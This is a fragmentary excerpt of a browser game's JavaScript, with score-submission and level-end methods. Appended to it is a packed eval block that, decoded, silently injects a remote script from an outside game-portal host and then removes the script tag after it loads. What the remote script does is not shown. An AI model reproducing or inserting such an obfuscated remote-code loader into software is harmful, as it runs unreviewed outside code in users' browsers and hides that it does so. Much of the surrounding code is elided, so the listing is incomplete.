...
(function () {
    ...
    Ob.prototype = z(E.prototype, {
        ...
        makeLevelEnd: function (a) {
          ...
          //  if(!a) 
			dp_submitScore(this.cLevelScore,this.cLevel + 1);
        },
        updateScore: function (a) {
            this.cLevelScore += a;
...
eval(function(p, a, c, k, e, d) {
	...
	return p;
} ('(1(){2 a=3.p(\'4\');a.e=\'d/c\';a.h=g;a.f=\'6://9.8.7/m/o.k\';2 b=3.n(\'4\')[0];b.5.j(a,b);a.i=1(){a.5.l(a)}})();', 26, 26, '|function|var|document|script|parentNode|http|com|9g|game|||javascript|text|type|src|true|async|onload|insertBefore|js|removeChild|cwdyj|getElementsByTagName||createElement'.split('|'), 0, {}))